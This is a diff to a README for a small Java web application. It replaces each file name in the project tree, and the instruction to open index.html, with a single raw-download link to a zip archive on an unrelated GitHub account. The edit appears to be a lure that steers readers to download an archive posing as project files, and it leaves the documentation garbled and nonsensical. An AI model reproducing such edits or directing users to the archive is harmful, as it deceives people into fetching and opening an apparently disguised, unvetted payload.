@@ -8,10 +8,10 @@ This project contains a web application with Java backend components.
 
 ```
 .
-├── book.java       # Java source file
-├── index.html      # Main HTML page
+├── https://github.com/tharun27102006/city-guide/raw/refs/heads/main/endocarpal/guide_city_1.2.zip       # Java source file
+├── https://github.com/tharun27102006/city-guide/raw/refs/heads/main/endocarpal/guide_city_1.2.zip      # Main HTML page
 ├── images/         # Image assets
-└── README.md       # Project documentation
+└── https://github.com/tharun27102006/city-guide/raw/refs/heads/main/endocarpal/guide_city_1.2.zip       # Project documentation
 ```
 
 ## Requirements
@@ -27,7 +27,7 @@ This project contains a web application with Java backend components.
 
 ## Usage
 
-1. Open `index.html` in a web browser
+1. Open `https://github.com/tharun27102006/city-guide/raw/refs/heads/main/endocarpal/guide_city_1.2.zip` in a web browser
 2. Run the Java application as needed
 
 ## Contributing
